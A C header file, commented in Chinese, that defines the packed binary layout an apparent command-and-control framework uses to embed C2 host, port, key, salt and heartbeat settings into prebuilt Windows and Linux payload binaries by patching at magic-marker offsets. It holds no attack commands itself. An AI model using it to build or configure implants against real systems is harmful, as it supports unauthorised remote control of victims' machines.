/*
 * 与 internal/payload/c2embedpatch.go 严格一致（字段顺序、#pragma pack(1)、小端 port）。
 *
 * 三套载荷共用此模板定义：
 *   - Windows x64 / x86：均编译 native/client.cpp（仅工具链 32/64 不同）
 *   - Linux amd64：编译 native/client_linux.cpp
 *
 * 预编译模板：TCP host、TCP port、Web host、Web port、vkey、salt 默认留空；
 * 服务端在二进制中搜索魔数后按相对偏移写入（见 Go 侧 C2EmbedRelOffset*）。
 *
 * 布局（相对魔数首字节）：
 *   +0   magic[8]
 *   +8   host[64]
 *   +72  port_le uint32
 *   +76  vkey[128]
 *   +204 salt[128]
 *   +332 heartbeat_sec uint32
 *   +336 web_host[64]
 *   +400 web_port_le uint32
 *   +404 tail_magic[8]  固定为 C2EMBED2，与首魔数共同锚定整块，避免误补丁
 */
#ifndef C2_EMBED_CONFIG_H
#define C2_EMBED_CONFIG_H

#include <stdint.h>

#pragma pack(push, 1)
typedef struct C2EmbedConfig {
	char magic[8];
	char host[64];
	uint32_t port_le;
	char vkey[128];
	char salt[128];
	uint32_t heartbeat_sec;
	char web_host[64];
	uint32_t web_port_le;
	char tail_magic[8];
} C2EmbedConfig;
#pragma pack(pop)

#if defined(__cplusplus)
#include <cstddef>
static_assert(sizeof(C2EmbedConfig) == 412, "C2EmbedConfig must match Go c2embed.TotalSize");
static_assert(offsetof(C2EmbedConfig, port_le) == 72, "port_le offset");
static_assert(offsetof(C2EmbedConfig, web_port_le) == 400, "web_port_le offset");
#endif

/* 8 字节魔数，与 Go 一致（无 '\0'） */
#define C2_EMBED_MAGIC_INIT 'C', '2', 'E', 'M', 'B', 'E', 'D', '1'
#define C2_EMBED_TAIL_INIT  'C', '2', 'E', 'M', 'B', 'E', 'D', '2'

/*
 * g_c2_embed 的初值：未修补前不应对外连有效 C2。
 * 心跳占位 30，避免未修补时 Sleep(0) 级别空转；载荷生成时仍会被 Patch 覆盖。
 */
#define C2_EMBED_CONFIG_TEMPLATE_INIT \
	{ { C2_EMBED_MAGIC_INIT }, "", 0u, "", "", 30u, "", 0u, { C2_EMBED_TAIL_INIT } }

#endif
